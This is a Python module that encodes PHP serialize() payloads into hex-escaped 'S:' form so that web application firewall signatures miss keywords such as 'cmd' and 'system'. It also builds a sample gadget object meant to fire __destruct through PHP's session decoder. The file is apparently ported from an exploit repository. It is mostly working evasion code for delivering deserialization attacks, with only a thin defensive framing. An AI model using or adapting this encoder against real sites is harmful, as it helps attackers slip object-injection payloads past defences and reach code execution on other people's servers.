#!/usr/bin/env python3
# INDEX: hex-escape serialize strings to evade waf | all
"""WAF-evasion encoder for PHP `serialize()` payloads.

Rewrites serialized-object delivery so WAF signature rules that match on
serialize syntax (`O:\\d+:`, property/value keyword strings) no longer see the
bytes. For hardening application unserialize-sink delivery (e.g. session-poison
or handler-mismatch delivery).

Encoder:
  serp_hex  --  rewrite every `s:N:"..."` string token to the `S:` hex-escape
                form `S:N:"\\xx\\xx..."`. The `S:` escaped-string type (PHP
                5.2.1+) decodes to the identical string, but the literal
                property/value bytes (e.g. "cmd", "system") are hidden from
                byte-signature rules. The declared length N stays the DECODED
                byte count (unchanged from lowercase `s:`). The class name (a
                bare quoted token, not an `s:`/`S:` string) is NOT touched.
                Semantics-preserving on PHP 8.3.35 / 8.4.26 / 8.5.12; the
                hex-escaped object still fires __destruct through the php session
                decoder on 8.5.12.

The `plus_len` (`O:+N:` / `s:+N:`) leading-'+' length trick is intentionally
NOT emitted: PHP 8.2-8.5 unserialize() rejects a '+' in object class-name and
string lengths (returns false), so the gadget never instantiates.

Source: ported from JXJZJWHCM/PHP2Shell-Cyber-EXP (php2shell_exp.py
seed_body), re-verified against our builds. Pure stdlib.
"""
from __future__ import annotations

import re

# payload construction

def php_str(s: str) -> str:
    """`s:N:"..."` where N is the UTF-8 byte length (serialize() semantics)."""
    return 's:%d:"%s"' % (len(s.encode("utf-8", "surrogateescape")), s)


def php_object(cls: str, props: dict[str, str]) -> str:
    """Serialize a flat object `O:len:"cls":count:{ s:..;s:..; ... }` with all
    string properties/values."""
    body = "".join(php_str(k) + ";" + php_str(v) + ";" for k, v in props.items())
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), body)


# encoders

_S_TOKEN = re.compile(r's:(\d+):"((?:[^"\\]|\\.)*)";')


def serp_hex(serialized: str) -> str:
    """Rewrite every `s:N:"..."` string token to the `S:N:"\\xx.."` hex form.

    Preserves unserialize() semantics on PHP 5.2.1+ (tested 8.3/8.4/8.5).
    Property NAMES and string VALUES are hidden from byte-signature WAF rules;
    the class name (a bare quoted token, not an `s:`/`S:` string) is NOT touched.
    """
    def repl(m: re.Match) -> str:
        n, val = m.group(1), m.group(2)
        raw = val.encode("utf-8", "surrogateescape")
        return 'S:%s:"%s";' % (n, "".join("\\%02x" % b for b in raw))
    return _S_TOKEN.sub(repl, serialized)


# Strategy registry: name -> callable. Only PHP-semantics-preserving, OUR-build
# verified transforms belong here. `plain` is the identity.
STRATEGIES = {
    "plain": lambda s: s,
    "serp_hex": serp_hex,
}


def encode(serialized: str, strategy: str = "serp_hex") -> str:
    try:
        return STRATEGIES[strategy](serialized)
    except KeyError:
        raise ValueError(
            "unknown/unsupported strategy %r (available: %s). "
            "Note: plus_len (O:+N:) is intentionally absent -- rejected by "
            "PHP 8.2-8.5 unserialize; see module docstring."
            % (strategy, ", ".join(sorted(STRATEGIES))))


if __name__ == "__main__":
    obj = php_object("Logger", {"cmd": "id"})
    print("plain   :", obj)
    print("serp_hex:", encode(obj, "serp_hex"))
